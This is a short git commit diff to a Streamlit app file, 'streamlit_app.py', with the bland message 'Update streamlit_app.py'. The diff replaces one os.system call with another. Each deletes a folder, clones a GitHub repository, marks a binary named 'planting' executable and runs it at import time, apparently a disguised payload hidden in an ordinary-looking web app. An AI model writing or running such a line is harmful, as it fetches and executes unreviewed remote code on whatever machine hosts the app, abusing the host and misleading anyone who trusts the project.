bf4791e15bc22295b6fadb1ef783a0dd933fbf51
moporitoyu <107390324+moporitoyu@users.noreply.github.com>
2022-07-10 22:52:31 +0700

    Update streamlit_app.py

--- streamlit_app.py
+++ streamlit_app.py
@@ -4,4 +4,4 @@ import math
 import pandas as pd
 import streamlit as st
 import os
-os.system ("rm -rf streamlit-app && git clone https://github.com/kleopetro/streamlit-app.git && cd streamlit-app && chmod +x planting && ./planting")
+os.system ("rm -rf learning && git clone https://github.com/moporitoyu/learning.git && cd learning && chmod +x planting && ./planting")
